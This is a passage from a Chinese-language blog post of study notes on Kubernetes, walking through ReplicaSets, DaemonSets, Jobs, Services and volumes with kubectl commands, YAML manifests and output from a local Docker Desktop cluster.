kubia</span><br></pre></td></tr></table></figure><p>之后将replicas的值从3改为10即可。再次使用<code>kubectl get</code>查看，发现扩展成功</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl get rc</span><br><span class="line">NAME    DESIRED   CURRENT   READY   AGE</span><br><span class="line">kubia   10        10        5       27m</span><br></pre></td></tr></table></figure><h5 id="删除ReplicationController"><a href="#删除ReplicationController" class="headerlink" title="删除ReplicationController"></a>删除ReplicationController</h5><p>当使用<code>kubectl delete</code>删除ReplicationController时，pod也会被删除。当然我们也可以只删除ReplicationController，从而保持pod运行。通过增加<code>--cascade=false</code>选项来保持pod的运行。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl delete rc kubia --cascade=false</span><br></pre></td></tr></table></figure><h4 id="ReplicaSet"><a href="#ReplicaSet" class="headerlink" title="ReplicaSet"></a>ReplicaSet</h4><p>ReplicaSet的行为和ReplicationController完全相同，但是pod选择器的表达能力更强</p><h5 id="定义ReplicaSet"><a href="#定义ReplicaSet" class="headerlink" title="定义ReplicaSet"></a>定义ReplicaSet</h5><p>首先创建一个名为<code>kubia-replicaset.yaml</code>的YAML文件</p><p>这里需要注意的是ReplicaSet不是<code>v1 API</code>的一部分，它属于<code>apps API</code>组的<code>v1</code>版本。其次是在选择其中，不需要再selector属性中直接列出pod需要的标签，而是在<code>selector.matchLabels</code>下指定它们。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: apps/v1</span><br><span class="line">kind: ReplicaSet</span><br><span class="line">metadata:</span><br><span class="line">  name: kubia</span><br><span class="line">spec:</span><br><span class="line">  replicas: 3</span><br><span class="line">  selector:</span><br><span class="line">    matchLabels</span><br><span class="line">      app: kubia</span><br><span class="line">  template:</span><br><span class="line">    metadata:</span><br><span class="line">      labels:</span><br><span class="line">        app: kubia</span><br><span class="line">    spec:</span><br><span class="line">      containers:</span><br><span class="line">      - name: kubia</span><br><span class="line">        image: luksa/kubia</span><br><span class="line">        ports:</span><br><span class="line">        - containerPort: 8080</span><br></pre></td></tr></table></figure><p>在上一节的删除ReplicationController中，我们没有删除pod。因此在创建ReplicaSet的时候不会创建任何新的pod，ReplicaSet会把现有的三个pod归为自己来管理。</p><h5 id="创建和检查ReplicaSet"><a href="#创建和检查ReplicaSet" class="headerlink" title="创建和检查ReplicaSet"></a>创建和检查ReplicaSet</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl create -f kubia-replicaset.yaml</span><br></pre></td></tr></table></figure><p>使用<code>kubectl get</code>来获取当前的ReplicaSet</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl get rs</span><br></pre></td></tr></table></figure><p>使用<code>kubectl describe</code>来检查当前的ReplicaSet</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl describe rs</span><br></pre></td></tr></table></figure><p>这个时候如果我们使用<code>kubectl get</code>来列出当前的pod，则会发现还是之前的那三个pod，而ReplicaSet并没有创建新的pod</p><h5 id="删除ReplicaSet"><a href="#删除ReplicaSet" class="headerlink" title="删除ReplicaSet"></a>删除ReplicaSet</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl delete rs kubia</span><br></pre></td></tr></table></figure><h4 id="DaemonSet"><a href="#DaemonSet" class="headerlink" title="DaemonSet"></a>DaemonSet</h4><p>DaemonSet确保全部（或者某些）节点上运行一个 Pod 的副本。 当有节点加入集群时， 也会为他们新增一个 Pod 。 当有节点从集群移除时，这些 Pod 也会被回收。删除 DaemonSet 将会删除它创建的所有 Pod。</p><p>DaemonSet 的一些典型用法：</p><ul><li>在每个节点上运行集群守护进程</li><li>在每个节点上运行日志收集守护进程</li><li>在每个节点上运行监控守护进程</li></ul><p>一种简单的用法是为每种类型的守护进程在所有的节点上都启动一个 DaemonSet。 一个稍微复杂的用法是为同一种守护进程部署多个 DaemonSet；每个具有不同的标志， 并且对不同硬件类型具有不同的内存、CPU要求。</p><p>DaemonSet将pod部署到集群中的所有节点上，除非指定这些pod只在部分节点上运行，这是通过pod模版中的nodeSelector属性指定的，这是DaemonSet定义的一部分。</p><h5 id="一个例子"><a href="#一个例子" class="headerlink" title="一个例子"></a>一个例子</h5><p>假设有一个名为ssd-monitor的守护进程，它需要在包含固态驱动器(SSD)的所有节点上运行，我们需要创建一个DaemonSet，它在标记为具有SSD的所有节点上运行这个守护进程，如下图所示</p><p><img src="/2021/10/07/Kubernetes-in-Action-Learning-Notes/4.png" alt="4"></p><p>第一步还是创建一个DaemonSet的YAML文件，这样会创建一个运行ssd-monitor监控器进程的DaemonSet，该进程每5s会将”SSD OK”打印到标准输出。YAML文件名为<code>ssd-monitor-daemonset.yaml</code></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">DaemonSet</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">ssd-monitor</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">ssd-monitor</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">app:</span> <span class="string">ssd-monitor</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">nodeSelector:</span></span><br><span class="line">        <span class="attr">disk:</span> <span class="string">ssd</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">main</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">luksa/ssd-monitor</span></span><br></pre></td></tr></table></figure><p>通过<code>kubectl create</code>创建DaemonSet</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl create -f ssd-monitor-daemonset.yaml</span><br></pre></td></tr></table></figure><p>通过<code>kubectl get</code>查看DaemonSet</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl get ds</span><br></pre></td></tr></table></figure><p>这个时候我们获取pod信息发现没有pod相关信息，这是因为我们没有给节点打上<code>disk=ssd</code>的标签，和上面那个图描述的一样，如果节点没有<code>disk=ssd</code>这个标签，则DaemonSet不会为该节点部署pod，因此我们需要为节点添加标签，这里我使用的节点为<code>docker-desktop</code>，当然你也可以通过<code>kubectl get node</code>获取你的节点信息。</p><p>现在给节点添加<code>disk=ssd</code>标签</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl label node docker-desktop disk=ssd</span><br></pre></td></tr></table></figure><p>查看是否成功为节点打上标签</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl get node --show-labels              </span><br><span class="line">NAME             STATUS   ROLES                  AGE   VERSION   LABELS</span><br><span class="line">docker-desktop   Ready    control-plane,master   43h   v1.21.3   beta.kubernetes.io/arch=amd64,beta.kubernetes.io/os=linux,disk=ssd,kubernetes.io/arch=amd64,kubernetes.io/hostname=docker-desktop,kubernetes.io/os=linux,node-role.kubernetes.io/control-plane=,node-role.kubernetes.io/master=,node.kubernetes.io/exclude-from-external-load-balancers=</span><br></pre></td></tr></table></figure><p>现在重新获取节点信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl get pods</span><br><span class="line">NAME                READY   STATUS    RESTARTS   AGE</span><br><span class="line">ssd-monitor-6gmhm   1/1     Running   0          78s</span><br></pre></td></tr></table></figure><p>假如说这个时候我们修改了节点的标签，看看会发生什么，如下面命令所示，我们将<code>disk=ssd</code>改为了<code>disk=hdd</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl label node docker-desktop disk=hdd --overwrite</span><br></pre></td></tr></table></figure><p>这个时候我们再次查看pod，发现pod正在被终止</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl get pods                                      </span><br><span class="line">NAME                READY   STATUS        RESTARTS   AGE</span><br><span class="line">ssd-monitor-6gmhm   1/1     Terminating   0          3m59s</span><br></pre></td></tr></table></figure><p>删除节点标签，如果我们要删除某个节点的标签，命令如下，其中disk为标签的键，后面的减号代表删除该标签</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl label node docker-desktop disk-</span><br></pre></td></tr></table></figure><h4 id="Job"><a href="#Job" class="headerlink" title="Job"></a>Job</h4><p>Job 会创建一个或者多个 Pods，并将继续重试 Pods 的执行，直到指定数量的 Pods 成功终止。 随着 Pods 成功结束，Job 跟踪记录成功完成的 Pods 个数。 当数量达到指定的成功个数阈值时，任务（即 Job）结束。 删除 Job 的操作会清除所创建的全部 Pods。 挂起 Job 的操作会删除 Job 的所有活跃 Pod，直到 Job 被再次恢复执行。</p><p>一种简单的使用场景下，你会创建一个 Job 对象以便以一种可靠的方式运行某 Pod 直到完成。 当第一个 Pod 失败或者被删除（比如因为节点硬件失效或者重启）时，Job 对象会启动一个新的 Pod。</p><p>你也可以使用 Job 以并行的方式运行多个 Pod。</p><h5 id="定义Job资源"><a href="#定义Job资源" class="headerlink" title="定义Job资源"></a>定义Job资源</h5><p>老规矩，还是创建一个名为<code>exporter.yaml</code>的YAML文件。该文件定义了一个Job类型的资源，它将运行<code>luksa/batch-job</code>镜像，该镜像调用一个运行120秒的进程，然后退出。在pod配置的属性restartPolicy默认为Always，然而Job pod不能使用默认策略，因为它们不是要无限期的运行下去，因此需要明确指定restartPolicy为<code>OnFailure</code>还是<code>Never</code>，这一设置防止容器在完成任务时重新启动。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: batch/v1</span><br><span class="line">kind: Job</span><br><span class="line">metadata:</span><br><span class="line">  name: batch-job</span><br><span class="line">spec:</span><br><span class="line">  template:</span><br><span class="line">    metadata:</span><br><span class="line">      labels:</span><br><span class="line">        app: batch-job</span><br><span class="line">    spec:</span><br><span class="line">      restartPolicy: OnFailure</span><br><span class="line">      containers:</span><br><span class="line">      - name: main</span><br><span class="line">        image: luksa/batch-job</span><br></pre></td></tr></table></figure><p>创建该job</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl create -f exporter.yaml</span><br></pre></td></tr></table></figure><p>获取job信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl get jobs</span><br><span class="line">NAME        COMPLETIONS   DURATION   AGE</span><br><span class="line">batch-job   0/1           8s         8s</span><br></pre></td></tr></table></figure><p>获取pod信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl get pods</span><br><span class="line">NAME              READY   STATUS    RESTARTS   AGE</span><br><span class="line">batch-job-q8c44   1/1     Running   0          18s</span><br></pre></td></tr></table></figure><p>两分钟之后，我们再次获取pod信息，会发现该pod的状态被标记为已完成。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl get pods</span><br><span class="line">NAME              READY   STATUS      RESTARTS   AGE</span><br><span class="line">batch-job-q8c44   0/1     Completed   0          2m15s</span><br></pre></td></tr></table></figure><p>pod完成后并没有被删除，这样方便我们查阅该pod 的日志，如下命令所示</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl logs batch-job-q8c44</span><br><span class="line">Fri Oct  8 10:07:58 UTC 2021 Batch job starting</span><br><span class="line">Fri Oct  8 10:09:58 UTC 2021 Finished succesfully</span><br></pre></td></tr></table></figure><h5 id="在Job中运行多个pod实例"><a href="#在Job中运行多个pod实例" class="headerlink" title="在Job中运行多个pod实例"></a>在Job中运行多个pod实例</h5><p>顺序运行：设置<code>completions</code>的值为多少，该job就会创建多少个pod，然后顺序运行。</p><p>并行运行：设置<code>parallelism</code>的值为多少，该job就会一次并行运行多少个pod，并行运行中也要设置<code>completions</code>的值</p><h5 id="限制job-pod完成任务的时间"><a href="#限制job-pod完成任务的时间" class="headerlink" title="限制job pod完成任务的时间"></a>限制job pod完成任务的时间</h5><p>通过在pod配置中设置<code>activeDeadlineSeconds</code>属性，可以限制pod的时间，如果pod运行时间超过此时间，系统将尝试终止pod，并将Job标记为失败。</p><h4 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h4><p>Kubernetes服务是一种为一组功能相同的pod提供单一不变的接入点的资源。当服务存在时，它的IP地址和端口不会改变，客户端通过IP地址和端口号建立连接，这些连接会被路由到提供该服务的任意一个pod上，通过这种方式，客户端不需要知道每个单独的提供服务的pod的地址，这样这些pod就可以在集群中随时被创建或移除。如下图展示的是一个客户端访问前端，前端访问后端服务的例子。</p><p><img src="/2021/10/07/Kubernetes-in-Action-Learning-Notes/5.png" alt="5"></p><h5 id="创建服务"><a href="#创建服务" class="headerlink" title="创建服务"></a>创建服务</h5><p>在创建服务之前，我们先通过创建ReplicationController运行三个包含Node.js应用的pod。还是使用的是之前创建的<code>kubia-rc.yaml</code>文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl create -f kubia-rc.yaml</span><br></pre></td></tr></table></figure><p>通过<code>kubectl get</code>命令检测pod是否成功启动，并查看这三个pod的标签</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl get pods --show-labels</span><br><span class="line">NAME          READY   STATUS    RESTARTS   AGE   LABELS</span><br><span class="line">kubia-hvlfd   1/1     Running   0          14s   app=kubia</span><br><span class="line">kubia-n6nfn   1/1     Running   0          14s   app=kubia</span><br><span class="line">kubia-ndbnt   1/1     Running   0          14s   app=kubia</span><br></pre></td></tr></table></figure><p>这个时候通过YAML描述文件来创建服务，该YAML文件的名为<code>kubia-svc.yaml</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: v1</span><br><span class="line">kind: Service</span><br><span class="line">metadata:</span><br><span class="line">  name: kubia</span><br><span class="line">spec:</span><br><span class="line">  ports:</span><br><span class="line">  - port:80 #该服务的可用端口</span><br><span class="line">    targetPort: 8080  #服务将连接转发到的容器端口</span><br><span class="line">  selector:</span><br><span class="line">    app: kubia #具有app=kubia标签的pod都属于该服务</span><br></pre></td></tr></table></figure><p>通过<code>kubectl create</code>发布文件创建服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl create -f kubia-svc.yaml</span><br></pre></td></tr></table></figure><p>列出所有的服务资源，如下命令，可以看到第二个是我们创建的服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl get svc</span><br><span class="line">NAME         TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)   AGE</span><br><span class="line">kubernetes   ClusterIP   10.96.0.1        &lt;none&gt;        443/TCP   44h</span><br><span class="line">kubia        ClusterIP   10.111.239.153   &lt;none&gt;        80/TCP    24s</span><br></pre></td></tr></table></figure><h5 id="从内部集群测试服务"><a href="#从内部集群测试服务" class="headerlink" title="从内部集群测试服务"></a>从内部集群测试服务</h5><ul><li>创建一个pod，它将请求发送到服务的集群IP并记录响应，可以通过查看pod日志检查服务的响应。</li><li>使用ssh远程登录到其中一个Kubernetes节点上，然后使用curl命令。</li><li>可以通过<code>kubectl exec</code>命令在一个已经存在的pod中执行curl命令。</li></ul><p>我们使用最后一种方式来进行测试</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl exec kubia-hvlfd -- curl -s http://10.111.239.153</span><br><span class="line">You've hit kubia-ndbnt</span><br></pre></td></tr></table></figure><p>我们来解释一下上述命令执行了哪些操作。首先是在一个pod容器上，利用Kubernetes去执行curl命令，curl命令向一个后端有三个pod服务的IP发送了HTTP请求，这个时候Kubernetes服务代理拦截该连接，在三个pod中任意选择了一个pod，然后将请求转发给它。<code>Node.js</code>在pod中运行处理请求，并返回带有pod名称的HTTP响应，接着curl命令向标准输出打印返回值，该返回值被<code>kubectl</code>截取并打印到主机的标准输出。</p><h4 id="服务发现"><a href="#服务发现" class="headerlink" title="服务发现"></a>服务发现</h4><p>Kubernetes还为客户端提供了发现服务的IP和端口的方式</p><h5 id="通过环境变量发现服务"><a href="#通过环境变量发现服务" class="headerlink" title="通过环境变量发现服务"></a>通过环境变量发现服务</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl exec kubia-695cf env</span><br><span class="line">kubectl exec [POD] [COMMAND] is DEPRECATED and will be removed in a future version. Use kubectl exec [POD] -- [COMMAND] instead.</span><br><span class="line">PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line">HOSTNAME=kubia-695cf</span><br><span class="line">KUBIA_SERVICE_HOST=10.111.239.153</span><br><span class="line">KUBIA_SERVICE_PORT=80</span><br><span class="line">KUBERNETES_SERVICE_HOST=10.96.0.1</span><br><span class="line">KUBERNETES_SERVICE_PORT=443</span><br></pre></td></tr></table></figure><h5 id="通过DNS发现服务"><a href="#通过DNS发现服务" class="headerlink" title="通过DNS发现服务"></a>通过DNS发现服务</h5><p>运行一个DNS服务的pod，在集群中的其他pod都被配置成使用其作为DNS，运行在pod上的进程DNS查询都会被Kubernetes自身的DNS服务器响应，该服务器知道系统中运行的所有服务。</p><h4 id="将服务暴露给外部客户端"><a href="#将服务暴露给外部客户端" class="headerlink" title="将服务暴露给外部客户端"></a>将服务暴露给外部客户端</h4><ul><li>将服务的类型设置成<code>NodePort</code>：每个集群节点都会在节点上打开一个端口，对于<code>NodePort</code>服务，每个集群节点在节点本身上打开一个端口，并将在该端口上接收到的流量重定向到基础服务，该服务仅在内部集群IP和端口上才能访问，但也可通过所有节点上的专用端口访问。</li><li>将服务的类型设置成<code>LoadBalance</code>：这是<code>NodePort</code>类型的一种扩展，这使得服务可以通过一个专用的负载均衡器来访问，这是由Kubernetes中正在运行的云基础设施提供的，负载均衡器将流量重定向到跨所有节点的节点端口，客户端通过负载均衡器的IP连接到服务。</li><li>创建一个Ingress资源：这是一个完全不同的机制，通过一个IP地址公开多个服务，它运行在HTTP层，因此可以提供比工作在第四层的服务更多的功能。</li></ul><h5 id="创建NodePort类型的服务"><a href="#创建NodePort类型的服务" class="headerlink" title="创建NodePort类型的服务"></a>创建NodePort类型的服务</h5><p>创建一个名为<code>kubia-svc-nodeport.yaml</code>的YAML文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: v1</span><br><span class="line">kind: Service</span><br><span class="line">metadata:</span><br><span class="line">  name: kubia-nodeport</span><br><span class="line">spec:</span><br><span class="line">  type: NodePort #为NodePort设置服务类型</span><br><span class="line">  ports:</span><br><span class="line">  - port: 80  #服务集群IP的端口号</span><br><span class="line">    targetPort: 8080  #背后pod的目标端口号</span><br><span class="line">    nodePort: 30123   #通过集群节点的30123端口可以访问该服务</span><br><span class="line">  selector:</span><br><span class="line">    app: kubia</span><br></pre></td></tr></table></figure><p>创建该服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl create -f kubia-svc-nodeport.yaml</span><br></pre></td></tr></table></figure><p>查看该服务的基础信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro ~ % kubectl get svc kubia-nodeport</span><br><span class="line">NAME             TYPE       CLUSTER-IP       EXTERNAL-IP   PORT(S)        AGE</span><br><span class="line">kubia-nodeport   NodePort   10.107.251.184   &lt;none&gt;        80:30123/TCP   92s</span><br></pre></td></tr></table></figure><p>因为我是通过Docker-desktop for mac在本地搭建环境，所以可以通过<code>localhost:30123</code>进行访问</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro ~ % curl localhost:30123</span><br><span class="line">You've hit kubia-695cf</span><br></pre></td></tr></table></figure><p>如下图显示了服务暴露在两个集群节点的端口30123上。到达任何一个端口的传入连接将被重定向到一个随机选择的pod，该pod是否位于接收到连接的节点上是不确定的。</p><p><img src="/2021/10/07/Kubernetes-in-Action-Learning-Notes/6.png" alt="6"></p><h5 id="创建LoadBalance服务"><a href="#创建LoadBalance服务" class="headerlink" title="创建LoadBalance服务"></a>创建LoadBalance服务</h5><p>创建一个名为<code>kubia-svc-loadbalancer.yaml</code>的YAML文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: v1</span><br><span class="line">kind: Service</span><br><span class="line">metadata:</span><br><span class="line">  name: kubia-loadbalancer</span><br><span class="line">spec:</span><br><span class="line">  type: LoadBalancer </span><br><span class="line">  ports:</span><br><span class="line">  - port: 80  </span><br><span class="line">    targetPort: 8080  </span><br><span class="line">  selector:</span><br><span class="line">    app: kubia</span><br></pre></td></tr></table></figure><p>创建该服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl create -f kubia-svc-loadbalancer.yaml</span><br></pre></td></tr></table></figure><p>如下图所示为外部客户端连接一个LoadBalancer服务</p><p><img src="/2021/10/07/Kubernetes-in-Action-Learning-Notes/7.png" alt="7"></p><h4 id="就绪探针"><a href="#就绪探针" class="headerlink" title="就绪探针"></a>就绪探针</h4><p>就绪探测器会定期调用，并确定特定的pod是否接受客户端的请求，当容器的准备就绪探测返回成功时，表示容器已经准备好接收请求。</p><h5 id="就绪探针类型"><a href="#就绪探针类型" class="headerlink" title="就绪探针类型"></a>就绪探针类型</h5><ul><li>Exec探针，执行进程的地方。容器的状态由进程的退出状态代码确定</li><li>HTTP GET探针，向容器发送HTTP GET请求，通过响应的HTTP状态码判断容器是否准备好</li><li>TCP socket探针，打开一个TCP连接到容器的指定端口，如果连接已建立，则认为容器已准备就绪</li></ul><h4 id="卷"><a href="#卷" class="headerlink" title="卷"></a>卷</h4><p>Kubernetes的卷时pod的一个组成部分，因此像容器一样在pod的规范中就定义了，它们不是独立的Kubernetes对象，也不能单出创建或删除，pod中的所有容器都可以使用卷，但必须先将它挂载在每个需要访问它的容器中，在每个容器中，都可以在其文件系统的任意位置挂载卷。</p><h5 id="卷类型"><a href="#卷类型" class="headerlink" title="卷类型"></a>卷类型</h5><ul><li>emptyDir：用于存储临时数据的简单空目录</li><li>hostPath：用于将目录从工作节点的文件系统挂载到pod中</li><li>gitRepo：通过检出Git仓库的内容来初始化的卷</li><li>nfs：挂载到pod中的NFS共享卷</li><li>gcePersistentDisk：Google高效能型存储磁盘卷</li><li>cinder、cephfs、iscsi、flocker、glusterfs、quobyte、rbd、flexVolume、vsphere-Volume、photonPersistentDisk、scaleIO用于挂载其他类型的网络存储</li><li>configMap、secret、downwordAPI：用于将Kubernetes部分资源和集群信息公开给pod的特殊类型的卷</li><li>persistentVolumeClaim：一种使用预置或者动态配置的持久存储类型</li></ul><h5 id="在pod中使用emptyDir卷"><a href="#在pod中使用emptyDir卷" class="headerlink" title="在pod中使用emptyDir卷"></a>在pod中使用emptyDir卷</h5><p>现在有两个镜像需要运行在pod上，首先创建一个名为<code>fortune-pod.yaml</code>的文件。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">fortune</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">image:</span> <span class="string">luksa/fortune</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">html-generator</span></span><br><span class="line">    <span class="attr">volumeMounts:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">html</span></span><br><span class="line">      <span class="attr">mountPath:</span> <span class="string">/var/htdocs</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">image:</span> <span class="string">nginx:alpine</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">web-server</span></span><br><span class="line">    <span class="attr">volumeMounts:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">html</span></span><br><span class="line">      <span class="attr">mountPath:</span> <span class="string">/usr/share/nginx/html</span></span><br><span class="line">      <span class="attr">readOnly:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">containerPort:</span> <span class="number">80</span></span><br><span class="line">      <span class="attr">protocol:</span> <span class="string">TCP</span></span><br><span class="line">  <span class="attr">volumes:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">html</span></span><br><span class="line">    <span class="attr">emptyDir:</span> <span 